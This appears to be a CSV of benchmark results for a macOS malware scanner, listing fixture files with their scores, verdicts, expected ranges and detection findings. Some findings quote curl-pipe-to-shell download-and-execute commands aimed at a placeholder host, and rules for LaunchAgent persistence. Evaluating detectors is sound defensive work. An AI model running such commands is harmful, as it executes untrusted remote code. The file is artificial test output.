run_id,sample_id,group,subtype,fixture_kind,path,detected_type,score,verdict,expected_verdict,expected_score_min,expected_score_max,matched_verdict,matched_score_range,mismatch_reason,status,error_code,analysis_duration_ms,timestamp,has_findings,error,analysis_summary,finding_delta_total,findings
"2026-03-11T13-08-37Z-6a8137","clean_plist_launchagent_template_01","clean","plist","file_fixture","clean/plist/clean_plist_launchagent_template_01.plist","plist","43","suspicious","clean","0","18","false","false","verdict_too_high","completed","","522","2026-03-11T13:08:40.523Z","true","","静态证据链：Matched unified threat profile section [url].；Matched unified threat profile section [url].；Keyword-level static signal; requires context to determine impact.。最终 Suspicious（可疑），得分 43/100。","46","Threat intel matched 1 unified rules | Hash rules are always evaluated for every file | Threat intel profile matched 1 rules | [intel.url.known_malicious_host] Threat Intel url [high] L0-0 Δ20: www.apple.com | [config.rule.file.intel.url.known_malicious_host] Threat Intel url [high] L0-0 Δ20: www.apple.com | Suspicious keywords: url:www.apple.com | Threat intel [url] hit: www.apple.com | No dedicated analyzer for plist. Fallback to generic analyzer. | generic_partial: No dedicated analyzer for plist. Fallback to generic analyzer."
"2026-03-11T13-08-37Z-6a8137","clean_python_config_rw_02","clean","python","file_fixture","clean/python/clean_python_config_rw_02.py","pythonScript","0","clean","clean","0","12","true","true","","completed","","287","2026-03-11T13:08:40.810Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T13-08-37Z-6a8137","clean_python_directory_scan_01","clean","python","file_fixture","clean/python/clean_python_directory_scan_01.py","pythonScript","0","clean","clean","0","10","true","true","","completed","","258","2026-03-11T13:08:41.068Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T13-08-37Z-6a8137","clean_python_log_rotate_01","clean","python","file_fixture","clean/python/clean_python_log_rotate_01.py","pythonScript","0","clean","clean","0","15","true","true","","completed","","274","2026-03-11T13:08:41.343Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T13-08-37Z-6a8137","clean_python_subprocess_safe_01","clean","python","file_fixture","clean/python/clean_python_subprocess_safe_01.py","pythonScript","35","clean","clean","5","18","true","false","score_too_high","completed","","246","2026-03-11T13:08:41.590Z","true","","静态证据链：检测到 subprocess.run/call/Popen，脚本可直接拉起外部二进制或 shell。；Keyword-level static signal; requires context to determine impact.。最终 Clean（低风险），得分 35/100。","32","检测到混淆或编码逃逸 | [python.subprocess_exec] subprocess 外部进程执行 [high] L11-11 Δ20: result = subprocess.run(cmd, check=True, capture_output=True, text=True) | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-11T13-08-37Z-6a8137","clean_python_text_summary_01","clean","python","file_fixture","clean/python/clean_python_text_summary_01.py","pythonScript","0","clean","clean","0","8","true","true","","completed","","266","2026-03-11T13:08:41.856Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T13-08-37Z-6a8137","clean_shell_backup_01","clean","shell","file_fixture","clean/shell/clean_shell_backup_01.sh","shellScript","0","clean","clean","0","15","true","true","","completed","","244","2026-03-11T13:08:42.100Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T13-08-37Z-6a8137","clean_shell_backup_02","clean","shell","file_fixture","clean/shell/clean_shell_backup_02.sh","shellScript","0","clean","clean","0","12","true","true","","completed","","293","2026-03-11T13:08:42.393Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T13-08-37Z-6a8137","clean_shell_log_archive_01","clean","shell","file_fixture","clean/shell/clean_shell_log_archive_01.sh","shellScript","0","clean","clean","0","12","true","true","","completed","","300","2026-03-11T13:08:42.694Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T13-08-37Z-6a8137","clean_shell_open_safe_site_01","clean","shell","file_fixture","clean/shell/clean_shell_open_safe_site_01.sh","shellScript","39","clean","clean","0","8","true","false","score_too_high","completed","","211","2026-03-11T13:08:42.906Z","true","","静态证据链：Matched unified threat profile section [url].；Matched unified threat profile section [url].；Keyword-level static signal; requires context to determine impact.。最终 Clean（低风险），得分 39/100。","36","检测到脚本高风险行为特征 | Threat intel profile matched 1 rules | [intel.url.known_malicious_host] Threat Intel url [high] L4-4 Δ20: www.apple.com | [config.rule.file.intel.url.known_malicious_host] Threat Intel url [high] L0-0 Δ20: www.apple.com | Threat intel [url] hit: www.apple.com | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-11T13-08-37Z-6a8137","clean_shell_write_test_plist_01","clean","shell","file_fixture","clean/shell/clean_shell_write_test_plist_01.sh","shellScript","39","clean","clean","0","14","true","false","score_too_high","completed","","290","2026-03-11T13:08:43.197Z","true","","静态证据链：Matched unified threat profile section [url].；Matched unified threat profile section [url].；Keyword-level static signal; requires context to determine impact.。最终 Clean（低风险），得分 39/100。","36","检测到脚本高风险行为特征 | Threat intel profile matched 1 rules | [intel.url.known_malicious_host] Threat Intel url [high] L11-11 Δ20: www.apple.com | [config.rule.file.intel.url.known_malicious_host] Threat Intel url [high] L0-0 Δ20: www.apple.com | Threat intel [url] hit: www.apple.com | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-11T13-08-37Z-6a8137","noisy_app_bundle_fixture_01","noisy_benign","app","app_bundle_fixture","noisy_benign/app/NoisyUtilityFixture_01.app","appBundle","0","clean","benign_noisy","12","30","true","false","score_too_low","completed","","1768","2026-03-11T13:08:44.965Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。","0","未获取到 Entitlements，权限边界不可完全判断 | 无法完整读取签名信息：/Users/wudazi/Beforeinstall/benchmark/noisy_benign/app/NoisyUtilityFixture_01.app: code object is not signed at all | 未提取到 Entitlements（可能该应用未声明或无法读取） | generic_partial: 无法完整读取签名信息：/Users/wudazi/Beforeinstall/benchmark/noisy_benign/app/NoisyUtilityFixture_01.app: code object is not signed at all | generic_partial: 未提取到 Entitlements（可能该应用未声明或无法读取）"
"2026-03-11T13-08-37Z-6a8137","noisy_app_updater_manifest_01","noisy_benign","app","manifest_fixture","noisy_benign/app/noisy_app_updater_manifest_01.json","unknown","0","clean","benign_noisy","18","38","true","false","score_too_low","completed","","505","2026-03-11T13:08:45.471Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。","0","Manifest/descriptor fixture uses lightweight parsing and does not represent full app/pkg execution coverage. | generic_partial: Manifest/descriptor fixture uses lightweight parsing and does not represent full app/pkg execution coverage."
"2026-03-11T13-08-37Z-6a8137","noisy_applescript_admin_prompt_sim_01","noisy_benign","applescript","file_fixture","noisy_benign/applescript/noisy_applescript_admin_prompt_sim_01.applescript","appleScript","0","clean","benign_noisy","18","40","true","false","score_too_low","completed","","212","2026-03-11T13:08:45.683Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T13-08-37Z-6a8137","noisy_applescript_finder_batch_rename_01","noisy_benign","applescript","file_fixture","noisy_benign/applescript/noisy_applescript_finder_batch_rename_01.applescript","appleScript","17","clean","benign_noisy","10","28","true","true","","completed","","281","2026-03-11T13:08:45.965Z","true","","静态证据链：脚本可控制 Finder 进行文件操作，需要结合上下文评估风险。；Keyword-level static signal; requires context to determine impact.。最终 Clean（低风险），得分 17/100。","14","检测到脚本高风险行为特征 | [applescript.finder_control] 控制 Finder 行为 [low] L3-3 Δ8: tell application ""Finder"""
"2026-03-11T13-08-37Z-6a8137","noisy_applescript_terminal_echo_pwd_01","noisy_benign","applescript","file_fixture","noisy_benign/applescript/noisy_applescript_terminal_echo_pwd_01.applescript","appleScript","21","clean","benign_noisy","12","30","true","true","","completed","","207","2026-03-11T13:08:46.172Z","true","","静态证据链：脚本可驱动 Terminal 执行命令，存在行为链隐藏风险。；Keyword-level static signal; requires context to determine impact.。最终 Clean（低风险），得分 21/100。","18","检测到脚本高风险行为特征 | [applescript.terminal_control] 控制 Terminal 应用 [medium] L1-1 Δ12: tell application ""Terminal"""
"2026-03-11T13-08-37Z-6a8137","noisy_js_child_process_ls_01","noisy_benign","js","file_fixture","noisy_benign/js/noisy_js_child_process_ls_01.js","javaScript","37","clean","benign_noisy","12","30","true","false","score_too_high","completed","","249","2026-03-11T13:08:46.421Z","true","","静态证据链：检测到 child_process 模块使用，可直接执行 shell 或二进制命令。；Keyword-level static signal; requires context to determine impact.。最终 Clean（低风险），得分 37/100。","34","检测到脚本高风险行为特征 | [javascript.child_process] Node child_process 执行链 [high] L2-2 Δ22: const { execFile } = require('child_process'); | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-11T13-08-37Z-6a8137","noisy_js_eval_math_only_01","noisy_benign","js","file_fixture","noisy_benign/js/noisy_js_eval_math_only_01.js","javaScript","31","clean","benign_noisy","15","35","true","true","","completed","","221","2026-03-11T13:08:46.643Z","true","","静态证据链：检测到 eval/Function 构造动态代码执行，存在混淆载荷风险。；Keyword-level static signal; requires context to determine impact.。最终 Clean（低风险），得分 31/100。","28","检测到混淆或编码逃逸 | [javascript.eval] JavaScript 动态执行(eval) [high] L3-3 Δ22: const result = eval(expression); | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-11T13-08-37Z-6a8137","noisy_js_network_cache_text_01","noisy_benign","js","file_fixture","noisy_benign/js/noisy_js_network_cache_text_01.js","javaScript","0","clean","benign_noisy","14","32","true","false","score_too_low","completed","","319","2026-03-11T13:08:46.962Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T13-08-37Z-6a8137","noisy_js_postinstall_sim_01","noisy_benign","js","file_fixture","noisy_benign/js/noisy_js_postinstall_sim_01.js","javaScript","73","suspicious","benign_noisy","20","42","false","false","verdict_too_high","completed","","237","2026-03-11T13:08:47.199Z","true","","静态证据链：Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].。最终 Suspicious（可疑），得分 73/100。","70","检测到脚本高风险行为特征 | Threat intel profile matched 2 rules | [intel.regexp.command_combo] Threat Intel regexp [high] L5-5 Δ14: curl https://example.invalid/pkg | [intel.regexp.command_combo] Threat Intel regexp [high] L5-5 Δ14: curl https://example.invalid/pkg | sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl https://example.invalid/pkg | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl https://example.invalid/pkg | sh | Threat intel [regexp] hit: curl https://example.invalid/pkg | Threat intel [regexp] hit: curl https://example.invalid/pkg | sh | Script analyzer detected 2 high-severity findings. | generic_partial: Script analyzer detected 2 high-severity findings."
"2026-03-11T13-08-37Z-6a8137","noisy_pkg_fixture_02","noisy_benign","pkg","pkg_directory_fixture","noisy_benign/pkg/noisy_pkg_fixture_02","pkg","11","clean","benign_noisy","15","35","true","false","score_too_low","completed","","319","2026-03-11T13:08:47.519Z","true","","静态证据链：Package pre/post install scripts can execute with installer privileges.。最终 Clean（低风险），得分 11/100。","11","安装包包含 pre/post install 脚本 | 安装后可能修改路径：./benchmark/sandbox_output/pkg_install_target, /payload"
"2026-03-11T13-08-37Z-6a8137","noisy_pkg_preinstall_sim_01","noisy_benign","pkg","file_fixture","noisy_benign/pkg/noisy_pkg_preinstall_sim_01.sh","shellScript","0","clean","benign_noisy","22","48","true","false","score_too_low","completed","","247","2026-03-11T13:08:47.767Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T13-08-37Z-6a8137","noisy_python_build_subprocess_01","noisy_benign","python","file_fixture","noisy_benign/python/noisy_python_build_subprocess_01.py","pythonScript","35","clean","benign_noisy","12","28","true","false","score_too_high","completed","","241","2026-03-11T13:08:48.008Z","true","","静态证据链：检测到 subprocess.run/call/Popen，脚本可直接拉起外部二进制或 shell。；Keyword-level static signal; requires context to determine impact.。最终 Clean（低风险），得分 35/100。","32","检测到混淆或编码逃逸 | [python.subprocess_exec] subprocess 外部进程执行 [high] L11-11 Δ20: result = subprocess.run(step, check=True, capture_output=True, text=True) | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-11T13-08-37Z-6a8137","noisy_python_dynamic_loader_sim_01","noisy_benign","python","file_fixture","noisy_benign/python/noisy_python_dynamic_loader_sim_01.py","pythonScript","0","clean","benign_noisy","16","35","true","false","score_too_low","completed","","297","2026-03-11T13:08:48.305Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T13-08-37Z-6a8137","noisy_python_remote_text_api_01","noisy_benign","python","file_fixture","noisy_benign/python/noisy_python_remote_text_api_01.py","pythonScript","0","clean","benign_noisy","14","32","true","false","score_too_low","completed","","236","2026-03-11T13:08:48.541Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T13-08-37Z-6a8137","noisy_python_tempfile_cleanup_01","noisy_benign","python","file_fixture","noisy_benign/python/noisy_python_tempfile_cleanup_01.py","pythonScript","0","clean","benign_noisy","10","24","true","false","score_too_low","completed","","265","2026-03-11T13:08:48.807Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T13-08-37Z-6a8137","noisy_python_updater_01","noisy_benign","python","file_fixture","noisy_benign/python/noisy_python_updater_01.py","pythonScript","0","clean","benign_noisy","20","45","true","false","score_too_low","completed","","291","2026-03-11T13:08:49.098Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T13-08-37Z-6a8137","noisy_shell_appsupport_style_write_01","noisy_benign","shell","file_fixture","noisy_benign/shell/noisy_shell_appsupport_style_write_01.sh","shellScript","0","clean","benign_noisy","10","24","true","false","score_too_low","completed","","267","2026-03-11T13:08:49.366Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T13-08-37Z-6a8137","noisy_shell_base64_config_01","noisy_benign","shell","file_fixture","noisy_benign/shell/noisy_shell_base64_config_01.sh","shellScript","0","clean","benign_noisy","12","30","true","false","score_too_low","completed","","272","2026-03-11T13:08:49.638Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T13-08-37Z-6a8137","noisy_shell_chmod_tool_01","noisy_benign","shell","file_fixture","noisy_benign/shell/noisy_shell_chmod_tool_01.sh","shellScript","0","clean","benign_noisy","10","26","true","false","score_too_low","completed","","254","2026-03-11T13:08:49.893Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T13-08-37Z-6a8137","noisy_shell_installer_like_01","noisy_benign","shell","file_fixture","noisy_benign/shell/noisy_shell_installer_like_01.sh","shellScript","98","suspicious","benign_noisy","20","45","false","false","verdict_too_high","completed","","268","2026-03-11T13:08:50.161Z","true","","静态证据链：检测到 curl 输出直接通过管道进入 sh/bash/zsh，属于典型远程代码直接执行链。；Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].。最终 Suspicious（可疑），得分 98/100。","95","检测到远程下载执行链 | Threat intel profile matched 2 rules | [shell.curl_pipe_sh] curl 下载后直接管道执行 [critical] L8-8 Δ35: DANGEROUS_LOOKING_CMD='curl -fsSL https://example.invalid/installer.sh | bash' | [intel.regexp.command_combo] Threat Intel regexp [high] L8-8 Δ14: curl -fssl https://example.invalid/installer.sh | [intel.regexp.command_combo] Threat Intel regexp [high] L8-8 Δ14: curl -fssl https://example.invalid/installer.sh | bash | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.invalid/installer.sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.invalid/installer.sh | bash | Threat intel [regexp] hit: curl -fssl https://example.invalid/installer.sh | Threat intel [regexp] hit: curl -fssl https://example.invalid/installer.sh | bash | Script analyzer detected 3 high-severity findings. | generic_partial: Script analyzer detected 3 high-severity findings."
"2026-03-11T13-08-37Z-6a8137","noisy_shell_update_checker_02","noisy_benign","shell","file_fixture","noisy_benign/shell/noisy_shell_update_checker_02.sh","shellScript","0","clean","benign_noisy","12","30","true","false","score_too_low","completed","","252","2026-03-11T13:08:50.414Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T13-08-37Z-6a8137","replay_clean_app_lifecycle_02","replay_clean","jsonReplay","replay_json","replay/clean/replay_clean_app_lifecycle_02.json","jsonReplay","0","unknown","","","","","","expectation_missing","completed","","7","2026-03-11T13:08:50.421Z","false","","Replay evaluation: unknown (score 0)","0",""
"2026-03-11T13-08-37Z-6a8137","replay_clean_backup_flow_01","replay_clean","replay_json","replay_json","replay/clean/replay_clean_backup_flow_01.json","jsonReplay","0","unknown","clean","0","15","false","true","verdict_too_low","completed","","1","2026-03-11T13:08:50.422Z","false","","Replay evaluation: unknown (score 0)","0",""
"2026-03-11T13-08-37Z-6a8137","replay_clean_js_fetch_cache_02","replay_clean","jsonReplay","replay_json","replay/clean/replay_clean_js_fetch_cache_02.json","jsonReplay","10","clean","","","","","","expectation_missing","completed","","1","2026-03-11T13:08:50.424Z","true","","Replay evaluation: clean (score 10)","10","[network.remote_connect] 运行期远程网络连接 (+10)"
"2026-03-11T13-08-37Z-6a8137","replay_clean_pkg_appsupport_install_02","replay_clean","jsonReplay","replay_json","replay/clean/replay_clean_pkg_appsupport_install_02.json","jsonReplay","0","unknown","","","","","","expectation_missing","completed","","2","2026-03-11T13:08:50.426Z","false","","Replay evaluation: unknown (score 0)","0",""
"2026-03-11T13-08-37Z-6a8137","replay_clean_python_scan_report_02","replay_clean","jsonReplay","replay_json","replay/clean/replay_clean_python_scan_report_02.json","jsonReplay","0","unknown","","","","","","expectation_missing","completed","","1","2026-03-11T13:08:50.428Z","false","","Replay evaluation: unknown (score 0)","0",""
"2026-03-11T13-08-37Z-6a8137","replay_malicious_app_bash_curl_persist_02","replay_malicious","jsonReplay","replay_json","replay/malicious/replay_malicious_app_bash_curl_persist_02.json","jsonReplay","75","malicious","","","","","","expectation_missing","completed","","3","2026-03-11T13:08:50.431Z","true","","Replay evaluation: malicious (score 75)","75","[persistence.launch_agent_write] 写入 LaunchAgent / LaunchDaemon (+30) | [process.spawn_shell] 样本拉起 Shell 子进程 (+15) | [network.remote_connect] 运行期远程网络连接 (+10) | [filesystem.sensitive_path_change] 修改敏感路径 (+20)"
"2026-03-11T13-08-37Z-6a8137","replay_malicious_app_osascript_chain_02","replay_malicious","jsonReplay","replay_json","replay/malicious/replay_malicious_app_osascript_chain_02.json","jsonReplay","25","clean","","","","","","expectation_missing","completed","","4","2026-03-11T13:08:50.436Z","true","","Replay evaluation: clean (score 25)","25","[process.spawn_shell] 样本拉起 Shell 子进程 (+15) | [network.remote_connect] 运行期远程网络连接 (+10)"
"2026-03-11T13-08-37Z-6a8137","replay_malicious_chain_01","replay_malicious","replay_json","replay_json","replay/malicious/replay_malicious_chain_01.json","jsonReplay","100","malicious","malicious","85","100","true","true","","completed","","1","2026-03-11T13:08:50.437Z","true","","Replay evaluation: malicious (score 100)","110","[script.download_execute_chain] 可疑脚本下载执行链 (+35) | [persistence.launch_agent_write] 写入 LaunchAgent / LaunchDaemon (+30) | [process.spawn_shell] 样本拉起 Shell 子进程 (+15) | [network.remote_connect] 运行期远程网络连接 (+10) | [filesystem.sensitive_path_change] 修改敏感路径 (+20)"
"2026-03-11T13-08-37Z-6a8137","replay_malicious_pkg_postinstall_multiegres_02","replay_malicious","jsonReplay","replay_json","replay/malicious/replay_malicious_pkg_postinstall_multiegres_02.json","jsonReplay","95","malicious","","","","","","expectation_missing","completed","","3","2026-03-11T13:08:50.441Z","true","","Replay evaluation: malicious (score 95)","95","[persistence.launch_agent_write] 写入 LaunchAgent / LaunchDaemon (+30) | [persistence.shell_profile] Shell Profile 持久化 (+20) | [process.spawn_shell] 样本拉起 Shell 子进程 (+15) | [network.remote_connect] 运行期远程网络连接 (+10) | [filesystem.sensitive_path_change] 修改敏感路径 (+20)"
"2026-03-11T13-08-37Z-6a8137","replay_malicious_python_subprocess_priv_02","replay_malicious","jsonReplay","replay_json","replay/malicious/replay_malicious_python_subprocess_priv_02.json","jsonReplay","25","clean","","","","","","expectation_missing","completed","","2","2026-03-11T13:08:50.444Z","true","","Replay evaluation: clean (score 25)","25","[process.spawn_shell] 样本拉起 Shell 子进程 (+15) | [network.remote_connect] 运行期远程网络连接 (+10)"
"2026-03-11T13-08-37Z-6a8137","replay_suspicious_app_shell_egress_02","replay_suspicious","jsonReplay","replay_json","replay/suspicious/replay_suspicious_app_shell_egress_02.json","jsonReplay","60","malicious","","","","","","expectation_missing","completed","","2","2026-03-11T13:08:50.446Z","true","","Replay evaluation: malicious (score 60)","60","[script.download_execute_chain] 可疑脚本下载执行链 (+35) | [process.spawn_shell] 样本拉起 Shell 子进程 (+15) | [network.remote_connect] 运行期远程网络连接 (+10)"
"2026-03-11T13-08-37Z-6a8137","replay_suspicious_persistence_attempt_01","replay_suspicious","replay_json","replay_json","replay/suspicious/replay_suspicious_persistence_attempt_01.json","jsonReplay","50","suspicious","suspicious","60","80","true","false","score_too_low","completed","","1","2026-03-11T13:08:50.447Z","true","","Replay evaluation: suspicious (score 50)","50","[persistence.launch_agent_write] 写入 LaunchAgent / LaunchDaemon (+30) | [filesystem.sensitive_path_change] 修改敏感路径 (+20)"
"2026-03-11T13-08-37Z-6a8137","replay_suspicious_pkg_persistence_mirror_02","replay_suspicious","jsonReplay","replay_json","replay/suspicious/replay_suspicious_pkg_persistence_mirror_02.json","jsonReplay","70","malicious","","","","","","expectation_missing","completed","","2","2026-03-11T13:08:50.450Z","true","","Replay evaluation: malicious (score 70)","70","[persistence.launch_agent_write] 写入 LaunchAgent / LaunchDaemon (+30) | [persistence.shell_profile] Shell Profile 持久化 (+20) | [filesystem.sensitive_path_change] 修改敏感路径 (+20)"
